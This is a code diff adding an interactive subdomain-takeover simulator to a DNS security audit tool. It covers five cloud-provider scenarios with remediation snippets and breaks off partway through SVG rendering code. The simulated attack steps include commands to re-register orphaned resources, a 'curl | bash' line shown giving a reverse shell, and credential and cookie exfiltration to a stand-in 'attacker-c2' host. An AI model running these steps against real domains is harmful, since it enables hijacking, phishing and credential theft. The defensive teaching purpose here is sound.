@@ -1794,7 +1794,7 @@ ${agency}`;
                                 <span>Co-Branded PDF</span>
                             </button>
                             <button type="button" 
-                                    onclick="simulateTakeoverAttack('${audit.detectedSaaS?.[0]?.preset || 'cname'}')" 
+                                    onclick="simulateTakeoverAttack('${audit.detectedSaaS?.[0]?.preset || 'cname'}', '${audit.detectedSaaS?.[0]?.sub || safeDomain}', '${audit.detectedSaaS?.[0]?.target || ''}')" 
                                     class="flex-1 sm:flex-none min-h-[42px] px-3.5 py-2 rounded-xl bg-gradient-to-r from-rose-500 to-red-600 hover:from-rose-400 hover:to-red-500 text-white font-bold text-xs uppercase font-sans tracking-wide shadow-md shadow-red-500/20 transition-all flex items-center justify-center gap-1.5 cursor-pointer pixel-btn whitespace-nowrap"
                                     title="Simulate exploit attack sequence in visual simulator">
                                 <span>⚡ Simulate Exploit</span>
@@ -1863,7 +1863,7 @@ ${agency}`;
                                     <div class="text-[10px] text-slate-500 mt-1">16 subdomains probed via RFC 8484 DoH</div>
                                 </div>
                                 <div class="mt-3 pt-2 border-t border-slate-800/80 flex items-center justify-between">
-                                    <button type="button" onclick="simulateTakeoverAttack('${audit.detectedSaaS?.[0]?.preset || 'cname'}')" class="text-[10px] text-rose-400 hover:text-rose-300 underline decoration-dotted cursor-pointer">
+                                    <button type="button" onclick="simulateTakeoverAttack('${audit.detectedSaaS?.[0]?.preset || 'cname'}', '${audit.detectedSaaS?.[0]?.sub || safeDomain}', '${audit.detectedSaaS?.[0]?.target || ''}')" class="text-[10px] text-rose-400 hover:text-rose-300 underline decoration-dotted cursor-pointer">
                                         ⚡ Launch Exploit Simulator &rarr;
                                     </button>
                                     <div class="text-[10px] text-emerald-400 cursor-pointer hover:underline" onclick="SimpleCat.explain('cname')">
@@ -3629,7 +3629,9 @@ ${payload.url}`;
     }
 
     // ==========================================
+    // ==========================================
     // 12. Project #7: Interactive Subdomain Takeover PoC Playground
+    //     & Feature 2: Visual Attack Tree / Takeover Simulator
     // ==========================================
 
     const _TAKEOVER_POC_PRESETS = {
@@ -3692,6 +3694,1016 @@ ${payload.url}`;
         { provider: 'Heroku', suffixes: ['herokuapp.com', 'herokudns.com'], fingerprints: ['no such app', "there's nothing here, yet."], nxdomain: false, remediation: 'Remove the Heroku CNAME record or register the custom domain in your Heroku app settings.' }
     ];
 
+    const _ATTACK_TREE_SCENARIOS = {
+        aws_s3: {
+            id: 'aws_s3',
+            label: 'AWS S3 Bucket Hijack',
+            provider: 'AWS S3',
+            subdomain: 'media.client-store.com',
+            cnameTarget: 'orphaned-client-media.s3.amazonaws.com',
+            fingerprint: 'NoSuchBucket',
+            cvss: 'CVSS 8.2 (HIGH/CRIT)',
+            adversaryAction: 'Adversary registers s3://orphaned-client-media in us-east-1 and uploads weaponized JavaScript',
+            payloadSummary: 'Cross-Site Scripting + Session Token Sniffer',
+            remediation: 'Immediately remove the dangling CNAME record from your DNS zone or claim the matching S3 bucket before third-party registration.',
+            fixSnippet: '# AWS S3 Dangling CNAME Remediation\n; Remove dangling CNAME record:\nmedia.client-store.com. 300 IN CNAME orphaned-client-media.s3.amazonaws.com. ; DELETE THIS\n; Or create the bucket in your AWS organization:\naws s3api create-bucket --bucket orphaned-client-media --region us-east-1',
+            curlPoc: 'curl -sI https://media.client-store.com\n# Inspect response headers for 404 NoSuchBucket signature',
+            steps: [
+                {
+                    num: 1,
+                    nodeTitle: '1. VICTIM CLIENT',
+                    nodeSub: 'visitor.browser',
+                    nodeBadge: '[REQUEST: GET]',
+                    stepTitle: 'Visitor Requests Brand Subdomain',
+                    statusBadge: 'INBOUND HTTP GET',
+                    badgeColor: 'border-cyan-500/50 bg-cyan-950/60 text-cyan-300',
+                    desc: 'A legitimate customer or automated visitor navigates to <code>https://media.client-store.com</code> expecting authentic brand assets under a trusted SSL certificate.',
+                    trace: 'GET /assets/catalog.pdf HTTP/2\nHost: media.client-store.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0',
+                    orbitInterception: 'Orbit Sentinel-01 observes incoming DNS/HTTP traffic to client brand perimeter.'
+                },
+                {
+                    num: 2,
+                    nodeTitle: '2. AUTHORITATIVE DNS',
+                    nodeSub: 'RFC-8484 CNAME Pointer',
+                    nodeBadge: '[DNS ROUTING]',
+                    stepTitle: 'Authoritative DNS CNAME Pointer Traversal',
+                    statusBadge: 'DANGLING POINTER',
+                    badgeColor: 'border-amber-500/50 bg-amber-950/60 text-amber-300',
+                    desc: 'Authoritative nameservers map <code>media.client-store.com</code> via CNAME to external cloud storage endpoint <code>orphaned-client-media.s3.amazonaws.com</code>.',
+                    trace: '$ dig +short CNAME media.client-store.com\norphaned-client-media.s3.amazonaws.com. (TTL 300)',
+                    orbitInterception: 'Orbit RFC-8484 Sentinel detects multi-tenant SaaS canonical name routing outside verified corporate ownership.'
+                },
+                {
+                    num: 3,
+                    nodeTitle: '3. ABANDONED TENANT',
+                    nodeSub: 'AWS S3 (NoSuchBucket)',
+                    nodeBadge: '[UNCLAIMED: 404]',
+                    stepTitle: 'Decommissioned / Abandoned Cloud Endpoint',
+                    statusBadge: 'VULNERABLE: UNCLAIMED S3 BUCKET',
+                    badgeColor: 'border-rose-500/50 bg-rose-950/60 text-rose-300',
+                    desc: 'AWS S3 returns HTTP 404 with <code>&lt;Code&gt;NoSuchBucket&lt;/Code&gt;</code>. Previous agency marketing campaign deleted bucket, but the DNS CNAME record was never purged.',
+                    trace: 'HTTP/1.1 404 Not Found\nx-amz-request-id: 7G8X99K2...\n<Error><Code>NoSuchBucket</Code><Message>The specified bucket does not exist</Message></Error>',
+                    orbitInterception: 'Orbit Passive Prober matches response fingerprint against 35+ known vulnerable cloud signatures with 0% risk of breaking production.'
+                },
+                {
+                    num: 4,
+                    nodeTitle: '4. THREAT ACTOR',
+                    nodeSub: 'Adversary Account',
+                    nodeBadge: '[HIJACK ARMED]',
+                    stepTitle: 'Threat Actor Re-Registration & Injection',
+                    statusBadge: 'TENANT CLAIMED ($0 COST)',
+                    badgeColor: 'border-purple-500/50 bg-purple-950/60 text-purple-300',
+                    desc: 'Adversary scans zone, discovers unclaimed bucket name, and registers <code>s3://orphaned-client-media</code> in AWS account. Mounts weaponized JavaScript payload.',
+                    trace: '$ aws s3api create-bucket --bucket orphaned-client-media --region us-east-1\n$ aws s3 cp weaponized_payload.js s3://orphaned-client-media/assets/catalog.pdf',
+                    orbitInterception: 'Threat actor takes full control of DNS destination without compromising client nameservers or cloud credentials.'
+                },
+                {
+                    num: 5,
+                    nodeTitle: '5. WEAPONIZED EXECUTION',
+                    nodeSub: 'SSL Padlock Exploited',
+                    nodeBadge: '[CRITICAL EXPLOITED]',
+                    stepTitle: 'Weaponized Execution & Brand Hijack',
+                    statusBadge: 'CRITICAL: CLIENT COMPROMISE',
+                    badgeColor: 'border-red-500/60 bg-red-950/80 text-red-300',
+                    desc: 'Victim receives adversary payload under client’s authentic SSL padlock (<code>https://media.client-store.com</code>). Malicious script steals parent <code>.client-store.com</code> cookies and exfiltrates credentials.',
+                    trace: 'PAYLOAD EXECUTION: document.cookie -> exfiltrated to adversary C2.\nBrowser Status: SECURE (Padlock Active)\nSame-Origin Policy: Bypassed via subdomain cookie inheritance',
+                    orbitInterception: 'Orbit generates 1-click BIND .zone, Terraform, and client-facing executive PDF to eliminate dangling record immediately.'
+                }
+            ]
+        },
+        github_pages: {
+            id: 'github_pages',
+            label: 'GitHub Pages 404',
+            provider: 'GitHub Pages',
+            subdomain: 'docs.agency-client.io',
+            cnameTarget: 'legacy-org.github.io',
+            fingerprint: "There isn't a GitHub Pages site here.",
+            cvss: 'CVSS 8.2 (HIGH/CRIT)',
+            adversaryAction: 'Adversary creates repository "legacy-org.github.io" or binds custom domain in GitHub settings',
+            payloadSummary: 'Trojanized SDK & Malicious Documentation Release',
+            remediation: 'Remove the CNAME DNS record pointing to github.io or add a CNAME file to the target GitHub repository immediately.',
+            fixSnippet: '# GitHub Pages Dangling CNAME Remediation\n; Remove CNAME record pointing to github.io:\ndocs.agency-client.io. 300 IN CNAME legacy-org.github.io. ; DELETE THIS\n; Or bind custom domain in repo:\necho "docs.agency-client.io" > CNAME && git commit -m "fix: re-claim CNAME" && git push',
+            curlPoc: 'curl -sI https://docs.agency-client.io\n# Inspect response for GitHub 404 banner',
+            steps: [
+                {
+                    num: 1,
+                    nodeTitle: '1. VICTIM CLIENT',
+                    nodeSub: 'visitor.browser',
+                    nodeBadge: '[REQUEST: GET]',
+                    stepTitle: 'Developer / Visitor Accesses Documentation',
+                    statusBadge: 'INBOUND WEB REQUEST',
+                    badgeColor: 'border-cyan-500/50 bg-cyan-950/60 text-cyan-300',
+                    desc: 'Engineers, clients, or customers visit <code>https://docs.agency-client.io</code> to access product guides and API references under valid SSL.',
+                    trace: 'GET /v1/install.sh HTTP/2\nHost: docs.agency-client.io\nUser-Agent: curl/8.4.0',
+                    orbitInterception: 'Orbit Sentinel records client subdomain resolution event.'
+                },
+                {
+                    num: 2,
+                    nodeTitle: '2. AUTHORITATIVE DNS',
+                    nodeSub: 'RFC-8484 CNAME Pointer',
+                    nodeBadge: '[DNS ROUTING]',
+                    stepTitle: 'DNS CNAME Pointer to GitHub Infrastructure',
+                    statusBadge: 'ROUTING TRAVERSAL',
+                    badgeColor: 'border-amber-500/50 bg-amber-950/60 text-amber-300',
+                    desc: 'DNS query resolves <code>docs.agency-client.io</code> to <code>legacy-org.github.io</code>.',
+                    trace: '$ dig +short CNAME docs.agency-client.io\n-> legacy-org.github.io. (TTL 300)',
+                    orbitInterception: 'Orbit identifies CNAME routing to GitHub Pages tenant namespace.'
+                },
+                {
+                    num: 3,
+                    nodeTitle: '3. ABANDONED TENANT',
+                    nodeSub: 'GitHub (404 Not Found)',
+                    nodeBadge: '[UNCLAIMED: 404]',
+                    stepTitle: 'GitHub Pages Endpoint Abandoned / Deleted',
+                    statusBadge: 'VULNERABLE: 404 RETURNED',
+                    badgeColor: 'border-rose-500/50 bg-rose-950/60 text-rose-300',
+                    desc: 'GitHub returns <code>404 There isn\'t a GitHub Pages site here</code>. The organization or repository was renamed, leaving the custom domain unmapped.',
+                    trace: 'HTTP/2 404 Not Found\nServer: GitHub.com\nContent-Type: text/html\nThere isn\'t a GitHub Pages site here.',
+                    orbitInterception: 'Orbit passive prober flags confirmed GitHub Pages takeover vulnerability.'
+                },
+                {
+                    num: 4,
+                    nodeTitle: '4. THREAT ACTOR',
+                    nodeSub: 'Adversary Account',
+                    nodeBadge: '[HIJACK ARMED]',
+                    stepTitle: 'Adversary Reclaims GitHub Repository',
+                    statusBadge: 'HOSTILE RE-REGISTRATION',
+                    badgeColor: 'border-purple-500/50 bg-purple-950/60 text-purple-300',
+                    desc: 'Attacker creates GitHub repository <code>legacy-org.github.io</code>, adds a <code>CNAME</code> file matching <code>docs.agency-client.io</code>, and deploys weaponized docs.',
+                    trace: '$ gh repo create legacy-org.github.io --public\n$ echo "docs.agency-client.io" > CNAME\n$ git push origin gh-pages',
+                    orbitInterception: 'Adversary claims control with standard zero-cost GitHub developer account.'
+                },
+                {
+                    num: 5,
+                    nodeTitle: '5. WEAPONIZED EXECUTION',
+                    nodeSub: 'SSL Padlock Exploited',
+                    nodeBadge: '[CRITICAL EXPLOITED]',
+                    stepTitle: 'Weaponized Documentation & Malicious SDKs',
+                    statusBadge: 'CRITICAL: SUPPLY-CHAIN POISONING',
+                    badgeColor: 'border-red-500/60 bg-red-950/80 text-red-300',
+                    desc: 'Visitors downloading SDK packages or running curl scripts from <code>docs.agency-client.io</code> receive backdoored code under valid brand SSL.',
+                    trace: 'curl -sSL https://docs.agency-client.io/v1/install.sh | bash\nResult: Reverse shell dispatched to attacker C2.\nStatus: 200 OK (Trusted Brand Certificate)',
+                    orbitInterception: 'Orbit issues instant DNS kill-switch recommendation and BIND zone cleanup ticket.'
+                }
+            ]
+        },
+        azure_nxdomain: {
+            id: 'azure_nxdomain',
+            label: 'Azure NXDOMAIN',
+            provider: 'Microsoft Azure',
+            subdomain: 'portal.enterprise-client.net',
+            cnameTarget: 'retired-app-prod.azurewebsites.net',
+            fingerprint: 'NXDOMAIN (Dangling Service Endpoint)',
+            cvss: 'CVSS 8.6 (HIGH/CRIT)',
+            adversaryAction: 'Adversary provisions Azure Web App named "retired-app-prod" before asuid TXT verification enforcement',
+            payloadSummary: 'Corporate SSO Login Cloner & Entra ID Credential Harvester',
+            remediation: 'Remove the dangling CNAME pointing to azurewebsites.net/cloudapp.azure.com or enable Azure Domain Verification ID (asuid TXT record).',
+            fixSnippet: '# Azure Dangling CNAME Remediation\n; Remove CNAME record pointing to azurewebsites.net:\nportal.enterprise-client.net. 300 IN CNAME retired-app-prod.azurewebsites.net. ; DELETE THIS\n; Or bind asuid TXT verification record:\nasuid.portal.enterprise-client.net. 300 IN TXT "YOUR_AZURE_CUSTOM_DOMAIN_VERIFICATION_ID"',
+            curlPoc: 'dig +short portal.enterprise-client.net CNAME\n# Target returns NXDOMAIN on azurewebsites.net',
+            steps: [
+                {
+                    num: 1,
+                    nodeTitle: '1. VICTIM CLIENT',
+                    nodeSub: 'visitor.browser',
+                    nodeBadge: '[REQUEST: GET]',
+                    stepTitle: 'Corporate Users Navigate to Enterprise Portal',
+                    statusBadge: 'INBOUND SSO ATTEMPT',
+                    badgeColor: 'border-cyan-500/50 bg-cyan-950/60 text-cyan-300',
+                    desc: 'Employees and external enterprise clients visit <code>https://portal.enterprise-client.net</code> to authenticate into cloud systems.',
+                    trace: 'GET /login HTTP/2\nHost: portal.enterprise-client.net\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
+                    orbitInterception: 'Orbit Sentinel monitors corporate portal DNS delegation.'
+                },
+                {
+                    num: 2,
+                    nodeTitle: '2. AUTHORITATIVE DNS',
+                    nodeSub: 'RFC-8484 CNAME Pointer',
+                    nodeBadge: '[DNS ROUTING]',
+                    stepTitle: 'DNS CNAME Points to Decommissioned Azure Tenant',
+                    statusBadge: 'ROUTING TRAVERSAL',
+                    badgeColor: 'border-amber-500/50 bg-amber-950/60 text-amber-300',
+                    desc: 'Authoritative DNS maps <code>portal.enterprise-client.net</code> to <code>retired-app-prod.azurewebsites.net</code>.',
+                    trace: '$ dig +short CNAME portal.enterprise-client.net\n-> retired-app-prod.azurewebsites.net.',
+                    orbitInterception: 'Orbit detects CNAME routing to decommissioned Microsoft Azure Web App host.'
+                },
+                {
+                    num: 3,
+                    nodeTitle: '3. ABANDONED TENANT',
+                    nodeSub: 'Azure (NXDOMAIN)',
+                    nodeBadge: '[NXDOMAIN: EMPTY]',
+                    stepTitle: 'Azure App Service Deleted (NXDOMAIN)',
+                    statusBadge: 'VULNERABLE: SERVICE DEREGISTERED',
+                    badgeColor: 'border-rose-500/50 bg-rose-950/60 text-rose-300',
+                    desc: 'Target Azure service returns NXDOMAIN. The development team deleted the resource after migration without informing DNS administrators.',
+                    trace: '$ host retired-app-prod.azurewebsites.net\nHost retired-app-prod.azurewebsites.net not found: 3(NXDOMAIN)',
+                    orbitInterception: 'Orbit Prong-A NXDOMAIN logic categorizes this as severe high-velocity takeover risk.'
+                },
+                {
+                    num: 4,
+                    nodeTitle: '4. THREAT ACTOR',
+                    nodeSub: 'Adversary Account',
+                    nodeBadge: '[HIJACK ARMED]',
+                    stepTitle: 'Adversary Registers Matching Azure App Service',
+                    statusBadge: 'AZURE TENANT CLAIMED',
+                    badgeColor: 'border-purple-500/50 bg-purple-950/60 text-purple-300',
+                    desc: 'Attacker creates an Azure App Service in their own Azure subscription named <code>retired-app-prod</code>, claiming the orphaned target.',
+                    trace: '$ az webapp create --name retired-app-prod --resource-group evil-group --plan evil-plan\n$ az webapp config hostname add --webapp-name retired-app-prod --hostname portal.enterprise-client.net',
+                    orbitInterception: 'Azure assigns host traffic to attacker container based on matching CNAME.'
+                },
+                {
+                    num: 5,
+                    nodeTitle: '5. WEAPONIZED EXECUTION',
+                    nodeSub: 'SSL Padlock Exploited',
+                    nodeBadge: '[CRITICAL EXPLOITED]',
+                    stepTitle: 'Weaponized Corporate SSO Phishing & MFA Intercept',
+                    statusBadge: 'CRITICAL: ENTERPRISE BREACH',
+                    badgeColor: 'border-red-500/60 bg-red-950/80 text-red-300',
+                    desc: 'Employees entering corporate credentials see an authentic lookalike login on the genuine domain with valid SSL. Credentials and session tokens are captured in real-time.',
+                    trace: 'POST /auth/login HTTP/2\nPayload: { "user": "finance-lead@client.net", "token": "sso-session-key" }\nDestination: https://attacker-c2.darknet/creds',
+                    orbitInterception: 'Orbit generates immediate remediation ticket and Microsoft asuid verification instruction.'
+                }
+            ]
+        },
+        vercel: {
+            id: 'vercel',
+            label: 'Vercel Alias',
+            provider: 'Vercel',
+            subdomain: 'preview.brand-campaign.com',
+            cnameTarget: 'cname.vercel-dns.com',
+            fingerprint: 'DEPLOYMENT_NOT_FOUND',
+            cvss: 'CVSS 8.0 (HIGH)',
+            adversaryAction: 'Attacker adds preview.brand-campaign.com as custom domain in attacker Vercel project',
+            payloadSummary: 'Campaign Interception & Customer Lead Stealer',
+            remediation: 'Delete the dangling Vercel CNAME record in DNS or re-bind the custom domain in your Vercel project settings.',
+            fixSnippet: '# Vercel Dangling CNAME Remediation\n; Remove dangling CNAME record:\npreview.brand-campaign.com. 300 IN CNAME cname.vercel-dns.com. ; DELETE THIS',
+            curlPoc: 'curl -sI https://preview.brand-campaign.com | grep -i "x-vercel-error"',
+            steps: [
+                {
+                    num: 1,
+                    nodeTitle: '1. VICTIM CLIENT',
+                    nodeSub: 'visitor.browser',
+                    nodeBadge: '[REQUEST: GET]',
+                    stepTitle: 'Visitor Follows Campaign Link to Subdomain',
+                    statusBadge: 'INBOUND PROMO TRAFFIC',
+                    badgeColor: 'border-cyan-500/50 bg-cyan-950/60 text-cyan-300',
+                    desc: 'Consumers and partners click campaign landing links for <code>https://preview.brand-campaign.com</code>.',
+                    trace: 'GET /summer-drop HTTP/2\nHost: preview.brand-campaign.com\nUser-Agent: Mozilla/5.0',
+                    orbitInterception: 'Orbit observes active public campaign route.'
+                },
+                {
+                    num: 2,
+                    nodeTitle: '2. AUTHORITATIVE DNS',
+                    nodeSub: 'RFC-8484 CNAME Pointer',
+                    nodeBadge: '[DNS ROUTING]',
+                    stepTitle: 'DNS CNAME Resolves to Vercel Anycast Edge',
+                    statusBadge: 'ROUTING TRAVERSAL',
+                    badgeColor: 'border-amber-500/50 bg-amber-950/60 text-amber-300',
+                    desc: 'DNS query maps subdomain to Vercel’s shared multi-tenant router <code>cname.vercel-dns.com</code>.',
+                    trace: '$ dig +short CNAME preview.brand-campaign.com\n-> cname.vercel-dns.com.',
+                    orbitInterception: 'Orbit flags multi-tenant SaaS destination.'
+                },
+                {
+                    num: 3,
+                    nodeTitle: '3. ABANDONED TENANT',
+                    nodeSub: 'Vercel (404 Deployment)',
+                    nodeBadge: '[UNCLAIMED: 404]',
+                    stepTitle: 'Vercel Deployment Not Found (404)',
+                    statusBadge: 'VULNERABLE: UNCLAIMED ALIAS',
+                    badgeColor: 'border-rose-500/50 bg-rose-950/60 text-rose-300',
+                    desc: 'Vercel returns <code>DEPLOYMENT_NOT_FOUND</code>. The agency project was deleted or domain was unbound from the Vercel dashboard.',
+                    trace: 'HTTP/2 404 Not Found\nserver: Vercel\nx-vercel-error: DEPLOYMENT_NOT_FOUND',
+                    orbitInterception: 'Orbit Sentinel fingerprints unclaimed Vercel deployment error code.'
+                },
+                {
+                    num: 4,
+                    nodeTitle: '4. THREAT ACTOR',
+                    nodeSub: 'Adversary Account',
+                    nodeBadge: '[HIJACK ARMED]',
+                    stepTitle: 'Adversary Binds Custom Domain in Vercel Project',
+                    statusBadge: 'DOMAIN ALIAS BOUND',
+                    badgeColor: 'border-purple-500/50 bg-purple-950/60 text-purple-300',
+                    desc: 'Attacker creates a new Vercel project and enters <code>preview.brand-campaign.com</code> as custom domain. Because CNAME already exists in DNS, verification passes.',
+                    trace: '$ vercel domains add preview.brand-campaign.com\nDomain verified via existing DNS CNAME! Routing activated.',
+                    orbitInterception: 'Vercel edge establishes TLS certificate and binds route to adversary project.'
+                },
+                {
+                    num: 5,
+                    nodeTitle: '5. WEAPONIZED EXECUTION',
+                    nodeSub: 'SSL Padlock Exploited',
+                    nodeBadge: '[CRITICAL EXPLOITED]',
+                    stepTitle: 'Weaponized Checkout & Lead Siphoning',
+                    statusBadge: 'CRITICAL: DATA HARVESTED',
+                    badgeColor: 'border-red-500/60 bg-red-950/80 text-red-300',
+                    desc: 'Campaign visitors land on attacker-controlled page under genuine brand certificate, submitting leads and credit card info into adversary hands.',
+                    trace: 'User Submit: { "name": "Jane Doe", "email": "jane@corp.com", "cc": "4111..." }\nStatus: 200 OK (Padlock Valid)',
+                    orbitInterception: 'Orbit generates immediate DNS removal snippet to sever edge association.'
+                }
+            ]
+        },
+        shopify: {
+            id: 'shopify',
+            label: 'Shopify Store',
+            provider: 'Shopify',
+            subdomain: 'outlet.dtc-retailer.com',
+            cnameTarget: 'shops.myshopify.com',
+            fingerprint: 'Sorry, this shop is currently unavailable.',
+            cvss: 'CVSS 8.2 (HIGH/CRIT)',
+            adversaryAction: 'Adversary connects custom domain to fresh Shopify trial store',
+            payloadSummary: 'Counterfeit Storefront & Payment Card Skimmer',
+            remediation: 'Delete the CNAME/A record pointing to shops.myshopify.com or re-claim the domain inside Shopify Admin -> Settings -> Domains.',
+            fixSnippet: '# Shopify Dangling CNAME Remediation\n; Remove CNAME record pointing to shops.myshopify.com:\noutlet.dtc-retailer.com. 300 IN CNAME shops.myshopify.com. ; DELETE THIS',
+            curlPoc: 'curl -sI https://outlet.dtc-retailer.com | grep -i "shopify"',
+            steps: [
+                {
+                    num: 1,
+                    nodeTitle: '1. VICTIM CLIENT',
+                    nodeSub: 'visitor.browser',
+                    nodeBadge: '[REQUEST: GET]',
+                    stepTitle: 'Shopper Accesses Outlet Storefront',
+                    statusBadge: 'INBOUND E-COMMERCE TRAFFIC',
+                    badgeColor: 'border-cyan-500/50 bg-cyan-950/60 text-cyan-300',
+                    desc: 'Shoppers navigate to <code>https://outlet.dtc-retailer.com</code> looking for seasonal merchandise.',
+                    trace: 'GET /collections/all HTTP/2\nHost: outlet.dtc-retailer.com',
+                    orbitInterception: 'Orbit Sentinel records client e-commerce host resolution.'
+                },
+                {
+                    num: 2,
+                    nodeTitle: '2. AUTHORITATIVE DNS',
+                    nodeSub: 'RFC-8484 CNAME Pointer',
+                    nodeBadge: '[DNS ROUTING]',
+                    stepTitle: 'DNS CNAME Routes to Shopify SaaS Edge',
+                    statusBadge: 'ROUTING TRAVERSAL',
+                    badgeColor: 'border-amber-500/50 bg-amber-950/60 text-amber-300',
+                    desc: 'DNS query routes to <code>shops.myshopify.com</code>.',
+                    trace: '$ dig +short CNAME outlet.dtc-retailer.com\n-> shops.myshopify.com.',
+                    orbitInterception: 'Orbit identifies Shopify SaaS infrastructure destination.'
+                },
+                {
+                    num: 3,
+                    nodeTitle: '3. ABANDONED TENANT',
+                    nodeSub: 'Shopify (404 Unavailable)',
+                    nodeBadge: '[UNCLAIMED: 404]',
+                    stepTitle: 'Shopify Store Closed / Domain Unlinked (404)',
+                    statusBadge: 'VULNERABLE: UNATTACHED DOMAIN',
+                    badgeColor: 'border-rose-500/50 bg-rose-950/60 text-rose-300',
+                    desc: 'Shopify returns <code>Sorry, this shop is currently unavailable</code>. Old outlet store was closed, but the DNS CNAME record remained.',
+                    trace: 'HTTP/2 404 Not Found\nServer: cloudflare\nSorry, this shop is currently unavailable.',
+                    orbitInterception: 'Orbit matches Shopify unlinked domain error banner.'
+                },
+                {
+                    num: 4,
+                    nodeTitle: '4. THREAT ACTOR',
+                    nodeSub: 'Adversary Account',
+                    nodeBadge: '[HIJACK ARMED]',
+                    stepTitle: 'Adversary Re-Links Domain to Fresh Store',
+                    statusBadge: 'STORE RE-LINKED',
+                    badgeColor: 'border-purple-500/50 bg-purple-950/60 text-purple-300',
+                    desc: 'Attacker creates a trial Shopify store and adds <code>outlet.dtc-retailer.com</code> as existing domain. Auto-verification succeeds.',
+                    trace: 'Shopify Admin: Connect Existing Domain -> outlet.dtc-retailer.com -> Connected Successfully',
+                    orbitInterception: 'Shopify issues Let\'s Encrypt SSL certificate bound to attacker store.'
+                },
+                {
+                    num: 5,
+                    nodeTitle: '5. WEAPONIZED EXECUTION',
+                    nodeSub: 'SSL Padlock Exploited',
+                    nodeBadge: '[CRITICAL EXPLOITED]',
+                    stepTitle: 'Counterfeit Storefront & Payment Card Harvesting',
+                    statusBadge: 'CRITICAL: FINANCIAL EXPLOITATION',
+                    badgeColor: 'border-red-500/60 bg-red-950/80 text-red-300',
+                    desc: 'Shoppers enter credit card details on fake store under client’s authentic domain with trusted SSL padlock.',
+                    trace: 'POST /checkout -> Captured CC details exfiltrated to attacker.\nBrand Trust: Destroyed\nChargeback Liability: $10,000s',
+                    orbitInterception: 'Orbit provides 1-command fix package to restore DNS sovereignty.'
+                }
+            ]
+        }
+    };
+
+    _ATTACK_TREE_SCENARIOS.cname = _ATTACK_TREE_SCENARIOS.aws_s3;
+    _ATTACK_TREE_SCENARIOS.dmarc = _ATTACK_TREE_SCENARIOS.azure_nxdomain;
+    _ATTACK_TREE_SCENARIOS.dotenv = _ATTACK_TREE_SCENARIOS.github_pages;
+    _ATTACK_TREE_SCENARIOS.php418 = _ATTACK_TREE_SCENARIOS.vercel;
+
+    function _safeTruncate(str, maxLen) {
+        if (!str) return '';
+        const s = String(str);
+        if (s.length <= maxLen) return escapeHtml(s);
+        return escapeHtml(s.slice(0, Math.max(1, maxLen - 2)) + '..');
+    }
+
+    function _buildAttackTreeSvg(inst, scenario, prefix) {
+        const step = inst.activeStep || 1;
+        const sub = _safeTruncate(inst.subdomain || scenario.subdomain, 20);
+        const cname = _safeTruncate(inst.cnameTarget || scenario.cnameTarget, 18);
+        const provider = _safeTruncate(inst.provider || scenario.provider, 18);
+        const fp = _safeTruncate(inst.fingerprint || scenario.fingerprint, 18);
+
+        function getNodeStyle(nodeNum) {
+            if (nodeNum === step) {
+                return {
+                    border: '#f43f5e',
+                    borderWidth: '3',
+                    fill: '#1f131a',
+                    filter: 'url(#glow-red)',
+                    textColor: '#ffffff',
+                    badgeBg: '#e11d48',
+                    badgeText: '#ffffff',
+                    badgeLabel: '[ACTIVE]'
+                };
+            } else if (nodeNum < step) {
+                return {
+                    border: '#10b981',
+                    borderWidth: '2',
+                    fill: '#06281e',
+                    filter: 'none',
+                    textColor: '#6ee7b7',
+                    badgeBg: '#059669',
+                    badgeText: '#ffffff',
+                    badgeLabel: '[TRAVERSED]'
+                };
+            } else {
+                return {
+                    border: '#334155',
+                    borderWidth: '1.5',
+                    fill: '#0a0f1d',
+                    filter: 'none',
+                    textColor: '#64748b',
+                    badgeBg: '#1e293b',
+                    badgeText: '#94a3b8',
+                    badgeLabel: '[PENDING]'
+                };
+            }
+        }
+
+        const s1 = getNodeStyle(1);
+        const s2 = getNodeStyle(2);
+        const s3 = getNodeStyle(3);
+        const s4 = getNodeStyle(4);
+        const s5 = getNodeStyle(5);
+
+        const p12 = "M 190 145 C 215 145, 215 95, 240 95";
+        const p23 = "M 390 95 L 440 95";
+        const p34 = "M 515 145 C 515 180, 540 215, 590 215";
+        const p45 = "M 740 215 C 775 215, 775 145, 810 145";
+        const p51 = "M 885 95 L 885 24 Q 885 10, 870 10 L 130 10 Q 115 10, 115 24 L 115 95";
+
+        const prefersReducedMotion = typeof window !== 'undefined' && window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+
+        return `
+        <svg viewBox="0 0 1000 280" class="w-full h-auto select-none overflow-visible font-mono" xmlns="http://www.w3.org/2000/svg">
+            <defs>
+                <filter id="glow-cyan" x="-20%" y="-20%" width="140%" height="140%">
+                    <feGaussianBlur stdDeviation="3" result="blur" />
+                    <feMerge><feMergeNode in="blur" /><feMergeNode in="SourceGraphic" /></feMerge>
+                </filter>
+                <filter id="glow-amber" x="-20%" y="-20%" width="140%" height="140%">
+                    <feGaussianBlur stdDeviation="3" result="blur" />
+                    <feMerge><feMergeNode in="blur" /><feMergeNode in="SourceGraphic" /></feMerge>
+                </filter>
+                <filter id="glow-red" x="-25%" y="-25%" width="150%" height="150%">
+                    <feGaussianBlur stdDeviation="4" result="blur" />
+                    <feMerge><feMergeNode in="blur" /><feMergeNode in="SourceGraphic" /></feMerge>
+                </filter>
+                <filter id="glow-purple" x="-20%" y="-20%" width="140%" height="140%">
+                    <feGaussianBlur stdDeviation="3" result="blur" />
+                    <feMerge><feMergeNode in="blur" /><feMergeNode in="SourceGraphic" /></feMerge>
+                </filter>
+                <marker id="arrow-cyan" viewBox="0 0 10 10" refX="6" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+                    <path d="M 0 1 L 8 5 L 0 9 z" fill="#06b6d4" />
+                </marker>
+                <marker id="arrow-amber" viewBox="0 0 10 10" refX="6" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+                    <path d="M 0 1 L 8 5 L 0 9 z" fill="#f59e0b" />
+                </marker>
+                <marker id="arrow-red" viewBox="0 0 10 10" refX="6" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+                    <path d="M 0 1 L 8 5 L 0 9 z" fill="#ef4444" />
+                </marker>
+                <marker id="arrow-purple" viewBox="0 0 10 10" refX="6" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+                    <path d="M 0 1 L 8 5 L 0 9 z" fill="#a855f7" />
+                </marker>
+                <marker id="arrow-dim" viewBox="0 0 10 10" refX="6" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+                    <path d="M 0 1 L 8 5 L 0 9 z" fill="#334155" />
